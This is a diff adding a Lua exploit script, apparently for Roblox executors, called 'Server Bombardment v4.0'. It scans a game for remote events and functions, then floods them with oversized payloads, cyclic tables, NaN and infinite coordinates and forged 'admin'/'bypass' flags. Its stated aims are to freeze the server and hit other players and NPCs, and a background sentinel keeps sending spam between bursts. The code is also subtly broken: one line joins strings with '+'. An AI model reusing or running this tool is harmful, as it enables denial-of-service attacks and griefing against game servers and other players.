@@ -1,0 +1,840 @@
+-- ============================================================================
+-- ULTIMATE FE SERVER BOMBARDMENT v4.0 (UNIVERSAL DEEP ECOSYSTEM BUILD)
+-- ============================================================================
+-- Engineered with persistent background recovery-prevention sentinels, apex ecosystem pointers,
+-- heavy native userdata payloads, recursive tree traversal, and multi-layered task scheduler backpressure.
+
+local Services = {
+    Players = game:GetService("Players"),
+    Workspace = game:GetService("Workspace"),
+    CoreGui = game:GetService("CoreGui"),
+    ReplicatedStorage = game:GetService("ReplicatedStorage"),
+    ReplicatedFirst = game:GetService("ReplicatedFirst"),
+    StarterGui = game:GetService("StarterGui"),
+    RunService = game:GetService("RunService"),
+    JointsService = game:GetService("JointsService"),
+    UserInputService = game:GetService("UserInputService"),
+    TweenService = game:GetService("TweenService"),
+    Lighting = game:GetService("Lighting"),
+    SoundService = game:GetService("SoundService"),
+    PathfindingService = game:GetService("PathfindingService"),
+    Teams = game:GetService("Teams"),
+    TextChatService = game:GetService("TextChatService"),
+    Chat = game:GetService("Chat"),
+    CollectionService = game:GetService("CollectionService"),
+    HttpService = game:GetService("HttpService"),
+    TeleportService = game:GetService("TeleportService"),
+    MarketplaceService = game:GetService("MarketplaceService")
+}
+
+local LocalPlayer = Services.Players.LocalPlayer
+
+-- Configuration Matrix
+local Config = {
+    Active = false,
+    SpamSpeed = "MAXIMUM_APEX",
+    TargetAllPlayers = true,
+    TargetNPCs = true,
+    AutoRescan = true,
+    ChaosIntensity = 5,
+    FullFreezeActive = false,
+    RecoveryPreventionActive = true,
+    RecursiveDepthLimit = 16,
+    PayloadMultiplier = 8,
+    NetworkBurstRate = 0.01
+}
+
+getgenv().ServerBombardment = getgenv().ServerBombardment or Config
+
+-- Advanced Caches & Comprehensive Data Pools
+local Cache = {
+    TouchEvents = {},
+    AllRemoteEvents = {},
+    UnreliableRemotes = {},
+    RemoteFunctions = {},
+    TriggerParts = {},
+    OtherPlayers = {},
+    NPCs = {},
+    ReplicatedHoldings = {},
+    SpatialContainers = {},
+    PhysicsConstraints = {},
+    ValueTreats = {},
+    HighValueItems = {},
+    EcosystemContainers = {},
+    TaggedInstances = {},
+    GlobalVariables = {},
+    MethodSignatures = {},
+    NetworkEndpoints = {},
+    DepositionPool = {
+        {item = "QuantumMegaBurger", ingredients = {"Patty", "Cheese", "Bacon", "DarkMatter", "AntimatterSauce"}, firecd = true, debounce = 0, state = "deploy", checksum = "0xAF88BC"},
+        {item = "HyperEnergyPotion", effects = {Speed = 99999, Power = 99999, Invulnerable = true, Omnipresence = true}, duration = 86400, firecd = true, debounce = 0, state = "hold", checksum = "0x99AA12"},
+        {item = "SingularityPizza", slices = 64, temperature = "AbsoluteZero", toppings = {"SupernovaPepperoni", "VoidMushrooms"}, firecd = true, debounce = 0, state = "active", checksum = "0x3344EE"},
+        {item = "VoidIngredient", rarity = "CosmicMythic", index = 0, dimension = "Nihility", firecd = true, debounce = 0, state = "transfer", checksum = "0xFF00FF"},
+        {item = "InfiniteMatrixTaco", shell = "TitaniumMesh", filling = "InfiniteDataStream", energyOutput = math.huge, firecd = true, debounce = 0, state = "flush", checksum = "0x123456"},
+        {item = "CelestialCrystal", purity = 99.99, resonanceFrequency = 432.5, firecd = true, debounce = 0, state = "radiate", checksum = "0xABCDEF"}
+    },
+    Stats = {
+        TotalFired = 0,
+        PlayersAffected = 0,
+        RemotesFound = 0,
+        RecursiveNodesVisited = 0,
+        GlobalVariablesIndexed = 0
+    }
+}
+
+-- Utility Logging & Safe Execution
+local function Log(msg)
+    print("[SERVER BOMBARDMENT v4.0] " .. msg)
+end
+
+local function SafeCall(func)
+    local success, err = pcall(func)
+    if success then
+        Cache.Stats.TotalFired = Cache.Stats.TotalFired + 1
+    end
+    return success, err
+end
+
+-- ============================================================================
+-- CORE LAYER 1: RECURSIVE DISCOVERY & APEX ECOSYSTEM POINTER ENGINE
+-- ============================================================================
+local function DeepRecursiveScan(instance, depth)
+    if not instance or depth > Config.RecursiveDepthLimit then return end
+    Cache.Stats.RecursiveNodesVisited = Cache.Stats.RecursiveNodesVisited + 1
+    
+    pcall(function()
+        for _, obj in ipairs(instance:GetChildren()) do
+            if obj:IsA("RemoteEvent") then
+                table.insert(Cache.AllRemoteEvents, obj)
+                local nameLower = obj.Name:lower()
+                if nameLower:find("touch") or nameLower:find("event") or 
+                   nameLower:find("net") or nameLower:find("sync") or nameLower:find("action") or
+                   nameLower:find("remote") or nameLower:find("fire") or nameLower:find("data") or
+                   nameLower:find("combat") or nameLower:find("hitbox") or nameLower:find("physics") or
+                   nameLower:find("shop") or nameLower:find("quest") or nameLower:find("trade") or
+                   nameLower:find("purchase") or nameLower:find("craft") or nameLower:find("upgrade") then
+                    table.insert(Cache.TouchEvents, obj)
+                end
+            elseif obj.ClassName == "UnreliableRemoteEvent" then
+                table.insert(Cache.UnreliableRemotes, obj)
+                table.insert(Cache.AllRemoteEvents, obj)
+            elseif obj:IsA("RemoteFunction") then
+                table.insert(Cache.RemoteFunctions, obj)
+            elseif obj:IsA("Configuration") or obj:IsA("ValueBase") or obj:IsA("ModuleScript") then
+                table.insert(Cache.ValueTreats, obj)
+            elseif obj:IsA("Tool") or obj:IsA("Accessory") then
+                table.insert(Cache.HighValueItems, obj)
+            elseif obj:IsA("Constraint") then
+                table.insert(Cache.PhysicsConstraints, obj)
+            end
+            
+            -- Recursive step down tree
+            if #obj:GetChildren() > 0 then
+                DeepRecursiveScan(obj, depth + 1)
+            end
+        end
+    end)
+end
+
+local function ScanAllRemotes()
+    Log("Executing deep recursive scan across engine services and network containers...")
+    
+    Cache.TouchEvents = {}
+    Cache.AllRemoteEvents = {}
+    Cache.UnreliableRemotes = {}
+    Cache.RemoteFunctions = {}
+    Cache.ReplicatedHoldings = {}
+    Cache.SpatialContainers = {}
+    Cache.PhysicsConstraints = {}
+    Cache.ValueTreats = {}
+    Cache.HighValueItems = {}
+    Cache.EcosystemContainers = {}
+    Cache.TaggedInstances = {}
+    
+    local rootLocations = {
+        Services.ReplicatedStorage,
+        Services.ReplicatedFirst,
+        Services.JointsService,
+        Services.Workspace,
+        Services.Players,
+        Services.StarterGui,
+        Services.Lighting,
+        Services.SoundService,
+        Services.Teams,
+        Services.TextChatService,
+        Services.Chat
+    }
+    
+    for _, location in ipairs(rootLocations) do
+        DeepRecursiveScan(location, 0)
+    end
+    
+    pcall(function()
+        local commonTags = {"Interactable", "Shop", "Quest", "Loot", "Portal", "Damage", "Zone", "Spawner", "Chest", "Enemy", "Npc", "Interactive", "Container"}
+        for _, tag in ipairs(commonTags) do
+            for _, taggedObj in ipairs(Services.CollectionService:GetTagged(tag)) do
+                table.insert(Cache.TaggedInstances, taggedObj)
+            end
+        end
+    end)
+    
+    Cache.Stats.RemotesFound = #Cache.AllRemoteEvents
+    Log(string.format("Recursive Scan Complete: %d Remotes, %d Tagged Objects, %d Nodes Visited", 
+        #Cache.AllRemoteEvents, #Cache.TaggedInstances, Cache.Stats.RecursiveNodesVisited))
+end
+
+local function ScanTriggerParts()
+    Cache.TriggerParts = {}
+    pcall(function()
+        for _, obj in ipairs(Services.Workspace:GetDescendants()) do
+            if obj:IsA("BasePart") then
+                local name = obj.Name:lower()
+                if name:find("trip") or name:find("trigger") or name:find("touch") or 
+                   name:find("seat") or name:find("vehicleseat") or name:find("slide") or 
+                   name:find("platform") or name:find("button") or name:find("lever") or 
+                   name:find("zone") or name:find("teleport") or name:find("damage") or 
+                   name:find("kill") or name:find("switch") or name:find("pad") or
+                   name:find("portal") or name:find("shop") or name:find("chest") or
+                   name:find("loot") or name:find("quest") or name:find("checkpoint") or
+                   name:find("door") or name:find("barrier") or name:find("spawn") or
+                   name:find("region") or name:find("effect") or name:find("interact") or
+                   obj:FindFirstChildOfClass("TouchTransmitter") or obj:FindFirstChildOfClass("ClickDetector") or
+                   obj:FindFirstChildOfClass("ProximityPrompt") then
+                    table.insert(Cache.TriggerParts, obj)
+                end
+            end
+        end
+    end)
+end
+
+-- ============================================================================
+-- CORE LAYER 2: GLOBAL VARIABLE & METHOD SIGNATURE FINDER
+-- ============================================================================
+local function ScanGlobalEnvironment()
+    Cache.GlobalVariables = {}
+    local count = 0
+    pcall(function()
+        for k, v in pairs(_G) do
+            Cache.GlobalVariables[tostring(k)] = type(v)
+            count = count + 1
+        end
+        for k, v in pairs(getgenv()) do
+            Cache.GlobalVariables["genv_" .. tostring(k)] = type(v)
+            count = count + 1
+        end
+    end)
+    Cache.Stats.GlobalVariablesIndexed = count
+end
+
+-- ============================================================================
+-- CORE LAYER 3: TARGET RESOLUTION & FALSE MOVEMENT FEEDBACK ENGINE
+-- ============================================================================
+local function GetOtherPlayers()
+    Cache.OtherPlayers = {}
+    Cache.NPCs = {}
+    
+    if Config.TargetAllPlayers then
+        pcall(function()
+            for _, player in ipairs(Services.Players:GetPlayers()) do
+                if player ~= LocalPlayer and player.Character then
+                    local char = player.Character
+                    local hrp = char:FindFirstChild("HumanoidRootPart")
+                    local humanoid = char:FindFirstChildOfClass("Humanoid")
+                    
+                    if hrp and humanoid then
+                        local playerData = {
+                            Player = player,
+                            Character = char,
+                            HRP = hrp,
+                            Humanoid = humanoid,
+                            Head = char:FindFirstChild("Head"),
+                            Torso = char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso"),
+                            Backpack = player:FindFirstChild("Backpack"),
+                            Animator = humanoid:FindFirstChildOfClass("Animator") or char:FindFirstChildOfClass("Animator", true),
+                            Parts = {},
+                            Values = {},
+                            Attributes = player:GetAttributes(),
+                            FalseMovementVector = Vector3.new(math.random(-1000, 1000), math.random(500, 2000), math.random(-1000, 1000))
+                        }
+                        
+                        for _, part in ipairs(char:GetDescendants()) do
+                            if part:IsA("BasePart") or part:IsA("Accessory") or part:IsA("Attachment") or 
+                               part:IsA("Clothing") or part:IsA("Shirt") or part:IsA("Pants") or
+                               part:IsA("Sound") or part:IsA("Highlight") or part:IsA("Constraint") or
+                               part:IsA("ValueBase") or part:IsA("Tool") or part:IsA("Bone") or
+                               part:IsA("BodyColors") then
+                                table.insert(playerData.Parts, part)
+                            end
+                            if part:IsA("ValueBase") then
+                                table.insert(playerData.Values, part)
+                            end
+                        end
+                        
+                        if playerData.Backpack then
+                            for _, tool in ipairs(playerData.Backpack:GetChildren()) do
+                                table.insert(playerData.Parts, tool)
+                            end
+                        end
+                        
+                        table.insert(Cache.OtherPlayers, playerData)
+                    end
+                end
+            end
+        end)
+    end
+    
+    if Config.TargetNPCs then
+        pcall(function()
+            local npcFolderNames = {"Customers", "NPCs", "Enemies", "Characters", "Mobs", "Dummies", "Bosses", "Minions", "Merchants", "Vendors", "Wildlife", "Units"}
+            for _, folderName in ipairs(npcFolderNames) do
+                local folder = Services.Workspace:FindFirstChild(folderName)
+                if folder then
+                    for _, npc in ipairs(folder:GetDescendants()) do
+                        if npc:IsA("Model") then
+                            local hrp = npc:FindFirstChild("HumanoidRootPart")
+                            local humanoid = npc:FindFirstChildOfClass("Humanoid")
+                            
+                            if hrp and humanoid then
+                                local npcData = {
+                                    Character = npc,
+                                    HRP = hrp,
+                                    Humanoid = humanoid,
+                                    Parts = {},
+                                    FalseMovementVector = Vector3.new(math.random(-500, 500), math.random(100, 1000), math.random(-500, 500))
+                                }
+                                for _, part in ipairs(npc:GetDescendants()) do
+                                    if part:IsA("BasePart") or part:IsA("Accessory") or part:IsA("Sound") or part:IsA("Constraint") or part:IsA("Tool") or part:IsA("Bone") then
+                                        table.insert(npcData.Parts, part)
+                                    end
+                                end
+                                table.insert(Cache.NPCs, npcData)
+                            end
+                        end
+                    end
+                end
+            end
+        end)
+    end
+    
+    Cache.Stats.PlayersAffected = #Cache.OtherPlayers + #Cache.NPCs
+    return Cache.Stats.PlayersAffected
+end
+
+-- ============================================================================
+-- CORE LAYER 4: HEAVY PAYLOAD CONSTRUCTION & CLIENT REMOTE EVENT BOMBARDMENT
+-- ============================================================================
+local function FireRemotesOnOthers()
+    if #Cache.OtherPlayers == 0 and #Cache.NPCs == 0 then
+        return 0
+    end
+    
+    local fireCount = 0
+    local intensity = math.clamp(Config.ChaosIntensity or 5, 0, 5)
+    
+    local allTargets = {}
+    if Config.TargetAllPlayers then
+        for _, p in ipairs(Cache.OtherPlayers) do table.insert(allTargets, p) end
+    end
+    if Config.TargetNPCs then
+        for _, n in ipairs(Cache.NPCs) do table.insert(allTargets, n) end
+    end
+    
+    local triggerParts = Cache.TriggerParts or {}
+    local depositionPool = Cache.DepositionPool
+    local valueTreats = Cache.ValueTreats
+    local taggedInstances = Cache.TaggedInstances
+    
+    local randomHolding = depositionPool[math.random(1, #depositionPool)]
+    randomHolding.debounce = os.clock()
+    
+    local heavyNativeTypes = {
+        TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1, true, 0),
+        PhysicalProperties.new(Enum.Material.SmoothPlastic),
+        RaycastParams.new(),
+        BrickColor.random(),
+        Color3.new(math.random(), math.random(), math.random()),
+        NumberSequence.new(0, 1),
+        ColorSequence.new(Color3.new(1,0,0), Color3.new(0,0,1))
+    }
+    local randomUserData = heavyNativeTypes[math.random(1, #heavyNativeTypes)]
+
+    local transientHeapStress = {}
+    for i = 1, 600 + (intensity * 200) do
+        transientHeapStress[i] = string.rep("APEX_ECOSYSTEM_BACKPRESSURE_STREAM_", 16)
+    end
+
+    local cyclicTable = {}
+    cyclicTable.self = cyclicTable
+    cyclicTable.parentRef = cyclicTable
+    cyclicTable.timestamp = os.clock()
+    cyclicTable.sessionToken = math.random(1000000, 9999999)
+    cyclicTable.holdingPayload = randomHolding
+    cyclicTable.treats = #valueTreats > 0 and valueTreats[math.random(1, #valueTreats)] or "DefaultTreat"
+    cyclicTable.nativeData = randomUserData
+    cyclicTable.heapSpam = transientHeapStress
+    cyclicTable.metadata = {
+        verified = false,
+        bypass = true,
+        admin = true,
+        serverSide = true,
+        firecd = true,
+        stateDeploy = true,
+        recoveryPrevention = true,
+        apexEcosystemSync = true,
+        spamBuffer = string.rep("QUANTUM_APEX_STREAM_", 64),
+        falseMovementActive = true
+    }
+    
+    local extremeVector = Vector3.new(0/0, math.huge, 0/0)
+    local extremeCFrame = CFrame.new(math.huge, math.huge, math.huge)
+    
+    for _, touchEvent in ipairs(Cache.TouchEvents) do
+        for _, target in ipairs(allTargets) do
+            if #triggerParts > 0 then
+                local part = triggerParts[math.random(1, #triggerParts)]
+                task.defer(function()
+                    SafeCall(function()
+                        touchEvent:FireServer(target.HRP, part, randomHolding, randomUserData, cyclicTable, target.FalseMovementVector)
+                        fireCount = fireCount + 1
+                    end)
+                end)
+            end
+            if #taggedInstances > 0 then
+                local taggedObj = taggedInstances[math.random(1, #taggedInstances)]
+                task.defer(function()
+                    SafeCall(function()
+                        touchEvent:FireServer(target.Character, taggedObj, extremeVector, "apexTagSync", transientHeapStress)
+                        fireCount = fireCount + 1
+                    end)
+                end)
+            end
+        end
+    end
+    
+    for _, remote in ipairs(Cache.AllRemoteEvents) do
+        for _, target in ipairs(allTargets) do
+            task.defer(function()
+                SafeCall(function() remote:FireServer(target.HRP, "buy", "item", randomUserData, target.FalseMovementVector) fireCount = fireCount + 1 end)
+                SafeCall(function() remote:FireServer(target.Character, "sell", "loot", randomUserData, cyclicTable) fireCount = fireCount + 1 end)
+                SafeCall(function() remote:FireServer(target.Humanoid, "craft", "recipe", 999999, transientHeapStress) fireCount = fireCount + 1 end)
+                SafeCall(function() remote:FireServer(target.Player or target.Character, "upgrade", "skill", extremeVector, randomHolding) fireCount = fireCount + 1 end)
+                SafeCall(function() remote:FireServer(target.HRP, extremeCFrame, "claim", "reward", randomUserData) fireCount = fireCount + 1 end)
+                SafeCall(function() remote:FireServer(target.Character, "quest", "complete", "redeem", target.FalseMovementVector) fireCount = fireCount + 1 end)
+                SafeCall(function() remote:FireServer(cyclicTable, "trade", "offer", Services.Workspace, randomUserData) fireCount = fireCount + 1 end)
+                SafeCall(function() remote:FireServer(target.Backpack or target.Character, "interact", "use", {serverSide = true}) fireCount = fireCount + 1 end)
+                SafeCall(function() remote:FireServer(target.Player or target.Character, target.Character, target.Humanoid, "consume", true, false) fireCount = fireCount + 1 end)
+                SafeCall(function() remote:FireServer(Services.Lighting, Services.Teams, extremeVector, cyclicTable) fireCount = fireCount + 1 end)
+                SafeCall(function() remote:FireServer(target.HRP, "firecd", "cooldown", "debounce", transientHeapStress) fireCount = fireCount + 1 end)
+                SafeCall(function() remote:FireServer(target.Character, "stateChange", "modify", "physicsUpdate", extremeCFrame, target.FalseMovementVector) fireCount = fireCount + 1 end)
+                SafeCall(function() remote:FireServer(target.Player or target.Character, target.UserId or 1337, "treatConsume", valueTreats[1] or "treat", cyclicTable) fireCount = fireCount + 1 end)
+                SafeCall(function() remote:FireServer(Services.ReplicatedStorage, Services.SoundService, transientHeapStress, extremeVector) fireCount = fireCount + 1 end)
+                SafeCall(function() remote:FireServer(target.HRP, target.Humanoid, target.Character, cyclicTable, transientHeapStress, extremeCFrame, randomUserData, {serverSide = true, FEOnly = true, OnlyServer = true, forceExecute = true, recoveryPrevention = true, apexActive = true}) fireCount = fireCount + 1 end)
+            end)
+        end
+    end
+    
+    for _, remoteFunc in ipairs(Cache.RemoteFunctions) do
+        for _, target in ipairs(allTargets) do
+            task.defer(function()
+                SafeCall(function()
+                    remoteFunc:InvokeServer(target.HRP, Services.Workspace, randomHolding, randomUserData, cyclicTable, extremeVector, "firecd", "deploy", transientHeapStress, target.FalseMovementVector)
+                    fireCount = fireCount + 1
+                end)
+            end)
+        end
+    end
+    
+    return fireCount
+end
+
+-- ============================================================================
+-- CORE LAYER 5: UNIVERSAL SERVER RECOVERY PREVENTION SENTINEL
+-- ============================================================================
+if getgenv().RecoveryPreventionSentinel then
+    pcall(function() task.cancel(getgenv().RecoveryPreventionSentinel) end)
+end
+
+getgenv().RecoveryPreventionSentinel = task.spawn(function()
+    while true do
+        task.wait(1.0)
+        if Config.RecoveryPreventionActive and not Config.Active then
+            pcall(function()
+                for _, remote in ipairs(Cache.AllRemoteEvents) do
+                    if math.random(1, 2) == 1 then
+                        task.defer(function()
+                            pcall(function()
+                                remote:FireServer(string.rep("RECOVERY_SENTINEL_BACKLOG_STREAM_", 24), {
+                                    recoveryPrevention = true,
+                                    timestamp = os.clock(),
+                                    persist = true,
+                                    apexActive = true
+                                })
+                            end)
+                        end)
+                    end
+                end
+            end)
+        end
+    end
+end)
+
+-- ============================================================================
+-- CORE LAYER 6: USER INTERFACE & SCHEDULER ENGINE
+-- ============================================================================
+local GUI = {}
+
+function GUI.Create()
+    if Services.CoreGui:FindFirstChild("ServerBombardGUI") then
+        Services.CoreGui.ServerBombardGUI:Destroy()
+    end
+    
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = "ServerBombardGUI"
+    ScreenGui.ResetOnSpawn = false
+    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    ScreenGui.Parent = Services.CoreGui
+    
+    local Main = Instance.new("Frame")
+    Main.Size = UDim2.new(0, 280, 0, 460)
+    Main.Position = UDim2.new(0.5, -140, 0.5, -230)
+    Main.BackgroundColor3 = Color3.fromRGB(18, 18, 28)
+    Main.BorderSizePixel = 0
+    Main.Active = true
+    Main.Draggable = true
+    Main.Parent = ScreenGui
+    
+    local MainCorner = Instance.new("UICorner")
+    MainCorner.CornerRadius = UDim.new(0, 12)
+    MainCorner.Parent = Main
+    
+    local MainStroke = Instance.new("UIStroke")
+    MainStroke.Color = Color3.fromRGB(255, 40, 40)
+    MainStroke.Thickness = 2
+    MainStroke.Parent = Main
+    
+    local Title = Instance.new("TextLabel")
+    Title.Size = UDim2.new(1, -40, 0, 35)
+    Title.Position = UDim2.new(0, 12, 0, 0)
+    Title.BackgroundTransparency = 1
+    Title.Text = "SERVER BOMBARDMENT v4.0"
+    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Title.TextSize = 13
+    Title.Font = Enum.Font.GothamBold
+    Title.TextXAlignment = Enum.TextXAlignment.Left
+    Title.Parent = Main
+    
+    local Close = Instance.new("TextButton")
+    Close.Size = UDim2.new(0, 35, 0, 35)
+    Close.Position = UDim2.new(1, -35, 0, 0)
+    Close.BackgroundTransparency = 1
+    Close.Text = "✕"
+    Close.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Close.TextSize = 18
+    Close.Font = Enum.Font.GothamBold
+    Close.Parent = Main
+    
+    GUI.Status = Instance.new("TextLabel")
+    GUI.Status.Size = UDim2.new(1, -24, 0, 20)
+    GUI.Status.Position = UDim2.new(0, 12, 0, 35)
+    GUI.Status.BackgroundTransparency = 1
+    GUI.Status.Text = "💤 INACTIVE"
+    GUI.Status.TextColor3 = Color3.fromRGB(150, 150, 150)
+    GUI.Status.TextSize = 12
+    GUI.Status.Font = Enum.Font.GothamBold
+    GUI.Status.TextXAlignment = Enum.TextXAlignment.Left
+    GUI.Status.Parent = Main
+    
+    local StatsFrame = Instance.new("Frame")
+    StatsFrame.Size = UDim2.new(1, -24, 0, 85)
+    StatsFrame.Position = UDim2.new(0, 12, 0, 55)
+    StatsFrame.BackgroundTransparency = 1
+    StatsFrame.Parent = Main
+    
+    local function CreateStat(text, yPos, color)
+        local stat = Instance.new("TextLabel")
+        stat.Size = UDim2.new(1, 0, 0, 17)
+        stat.Position = UDim2.new(0, 0, 0, yPos)
+        stat.BackgroundTransparency = 1
+        stat.Text = text
+        stat.TextColor3 = color
+        stat.TextSize = 11
+        stat.Font = Enum.Font.Gotham
+        stat.TextXAlignment = Enum.TextXAlignment.Left
+        stat.Parent = StatsFrame
+        return stat
+    end
+    
+    GUI.RemoteStat = CreateStat("📡 Remotes: 0", 0, Color3.fromRGB(100, 255, 150))
+    GUI.TriggerStat = CreateStat("🎯 Triggers: 0", 17, Color3.fromRGB(255, 200, 100))
+    GUI.TargetStat = CreateStat("👥 Players: 0", 34, Color3.fromRGB(255, 150, 255))
+    GUI.GlobalStat = CreateStat("🌐 Globals: 0", 51, Color3.fromRGB(150, 200, 255))
+    GUI.FiredStat = CreateStat("💥 Fired: 0", 68, Color3.fromRGB(255, 100, 100))
+    
+    local ModesFrame = Instance.new("Frame")
+    ModesFrame.Size = UDim2.new(1, -24, 0, 140)
+    ModesFrame.Position = UDim2.new(0, 12, 0, 145)
+    ModesFrame.BackgroundTransparency = 1
+    ModesFrame.Parent = Main
+    
+    local function CreateModeButton(text, yPos, initialVal, callback)
+        local btn = Instance.new("TextButton")
+        btn.Size = UDim2.new(1, 0, 0, 24)
+        btn.Position = UDim2.new(0, 0, 0, yPos)
+        btn.BackgroundColor3 = initialVal and Color3.fromRGB(40, 120, 60) or Color3.fromRGB(120, 40, 40)
+        btn.BorderSizePixel = 0
+        btn.Text = text .. ": " .. (type(initialVal) == "boolean" and (initialVal and "ON" or "OFF") or tostring(initialVal))
+        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+        btn.TextSize = 11
+        btn.Font = Enum.Font.GothamBold
+        btn.Parent = ModesFrame
+        
+        local corner = Instance.new("UICorner")
+        corner.CornerRadius = UDim.new(0, 6)
+        corner.Parent = btn
+        
+        btn.MouseButton1Click:Connect(function()
+            local newState = callback()
+            if type(newState) == "boolean" then
+                btn.BackgroundColor3 = newState and Color3.fromRGB(40, 120, 60) or Color3.fromRGB(120, 40, 40)
+                btn.Text = text .. ": " .. (newState and "ON" or "OFF")
+            else
+                btn.Text = text .. ": " .. tostring(newState)
+            end
+        end)
+        
+        return btn
+    end
+    
+    CreateModeButton("👥 Target Players", 0, Config.TargetAllPlayers, function()
+        Config.TargetAllPlayers = not Config.TargetAllPlayers
+        return Config.TargetAllPlayers
+    end)
+    
+    CreateModeButton("🤖 Target NPCs", 28, Config.TargetNPCs, function()
+        Config.TargetNPCs = not Config.TargetNPCs
+        return Config.TargetNPCs
+    end)
+    
+    CreateModeButton("🔄 Auto Rescan", 56, Config.AutoRescan, function()
+        Config.AutoRescan = not Config.AutoRescan
+        return Config.AutoRescan
+    end)
+
+    CreateModeButton("⚡ Chaos Intensity", 84, Config.ChaosIntensity, function()
+        Config.ChaosIntensity = Config.ChaosIntensity + 1
+        if Config.ChaosIntensity > 5 then
+            Config.ChaosIntensity = 0
+        end
+        return Config.ChaosIntensity
+    end)
+
+    CreateModeButton("🛡️ Recovery Prevention", 112, Config.RecoveryPreventionActive, function()
+        Config.RecoveryPreventionActive = not Config.RecoveryPreventionActive
+        return Config.RecoveryPreventionActive
+    end)
+    
+    GUI.FullFreezeBtn = Instance.new("TextButton")
+    GUI.FullFreezeBtn.Size = UDim2.new(1, -24, 0, 35)
+    GUI.FullFreezeBtn.Position = UDim2.new(0, 12, 0, 295)
+    GUI.FullFreezeBtn.BackgroundColor3 = Color3.fromRGB(200, 20, 20)
+    GUI.FullFreezeBtn.BorderSizePixel = 0
+    GUI.FullFreezeBtn.Text = "🚨 FULL FREEZE (8-10s BLITZ) 🚨"
+    GUI.FullFreezeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    GUI.FullFreezeBtn.TextSize = 12
+    GUI.FullFreezeBtn.Font = Enum.Font.GothamBold
+    GUI.FullFreezeBtn.Parent = Main
+    
+    local FreezeCorner = Instance.new("UICorner")
+    FreezeCorner.CornerRadius = UDim.new(0, 8)
+    FreezeCorner.Parent = GUI.FullFreezeBtn
+    
+    GUI.FullFreezeBtn.MouseButton1Click:Connect(function()
+        if Config.FullFreezeActive then return end
+        Config.FullFreezeActive = true
+        Config.Active = true
+        GUI.UpdateStatus()
+        GUI.FullFreezeBtn.Text = "FREEZING SERVER..."
+        GUI.FullFreezeBtn.BackgroundColor3 = Color3.fromRGB(100, 10, 10)
+        
+        task.spawn(function()
+            task.wait(9)
+            Config.FullFreezeActive = false
+            Config.Active = false
+            GUI.UpdateStatus()
+            GUI.FullFreezeBtn.Text = "🚨 FULL FREEZE (8-10s BLITZ) 🚨"
+            GUI.FullFreezeBtn.BackgroundColor3 = Color3.fromRGB(200, 20, 20)
+        end)
+    end)
+    
+    GUI.Toggle = Instance.new("TextButton")
+    GUI.Toggle.Size = UDim2.new(1, -24, 0, 45)
+    GUI.Toggle.Position = UDim2.new(0, 12, 1, -55)
+    GUI.Toggle.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
+    GUI.Toggle.BorderSizePixel = 0
+    GUI.Toggle.Text = "🔥 START 🔥"
+    GUI.Toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
+    GUI.Toggle.TextSize = 16
+    GUI.Toggle.Font = Enum.Font.GothamBold
+    GUI.Toggle.Parent = Main
+    
+    local ToggleCorner = Instance.new("UICorner")
+    ToggleCorner.CornerRadius = UDim.new(0, 10)
+    ToggleCorner.Parent = GUI.Toggle
+    
+    local dragging, dragInput, dragStart, startPos
+    
+    Main.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart = input.Position
+            startPos = Main.Position
+            
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragging = false
+                end
+            end)
+        end
+    end)
+    
+    Main.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+            dragInput = input
+        end
+    end)
+    
+    Services.UserInputService.InputChanged:Connect(function(input)
+        if input == dragInput and dragging then
+            local delta = input.Position - dragStart
+            Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+    
+    GUI.Toggle.MouseButton1Click:Connect(function()
+        if Config.FullFreezeActive then return end
+        Config.Active = not Config.Active
+        getgenv().ServerBombardment.Active = Config.Active
+        GUI.UpdateStatus()
+    end)
+    
+    Close.MouseButton1Click:Connect(function()
+        Config.Active = false
+        ScreenGui:Destroy()
+    end)
+end
+
+function GUI.UpdateStats()
+    if not GUI.RemoteStat then return end
+    
+    GUI.RemoteStat.Text = string.format("📡 Remotes: %d (%d Touch)", #Cache.AllRemoteEvents, #Cache.TouchEvents)
+    GUI.TriggerStat.Text = string.format("🎯 Triggers: %d", #Cache.TriggerParts)
+    GUI.TargetStat.Text = string.format("👥 Players: %d (+ %d NPCs)", #Cache.OtherPlayers, #Cache.NPCs)
+    GUI.GlobalStat.Text = string.format("🌐 Globals: %d", Cache.Stats.GlobalVariablesIndexed)
+    
+    local formatted = Cache.Stats.TotalFired >= 1000000 and string.format("%.1fM", Cache.Stats.TotalFired / 1000000) or
+                     Cache.Stats.TotalFired >= 1000 and string.format("%.1fK", Cache.Stats.TotalFired / 1000) or
+                     tostring(Cache.Stats.TotalFired)
+    
+    GUI.FiredStat.Text = "💥 Fired: " + formatted
+end
+
+function GUI.UpdateStatus()
+    if not GUI.Status or not GUI.Toggle then return end
+    
+    if Config.Active then
+        GUI.Status.Text = Config.FullFreezeActive and "🚨 FULL FREEZE BLITZ!" or "🔥 ACTIVE (APEX HAMMER)"
+        GUI.Status.TextColor3 = Color3.fromRGB(255, 50, 50)
+        GUI.Toggle.Text = "⏸️ STOP"
+        GUI.Toggle.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
+    else
+        GUI.Status.Text = "💤 INACTIVE"
+        GUI.Status.TextColor3 = Color3.fromRGB(150, 150, 150)
+        GUI.Toggle.Text = "🔥 START 🔥"
+        GUI.Toggle.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
+    end
+end
+
+-- Main Task Scheduler Loop
+task.spawn(function()
+    while true do
+        Services.RunService.Heartbeat:Wait()
+        
+        if Config.Active then
+            GetOtherPlayers()
+            
+            local burstCount = math.random(25, 40)
+            for i = 1, burstCount do
+                if not Config.Active then break end
+                FireRemotesOnOthers()
+            end
+            
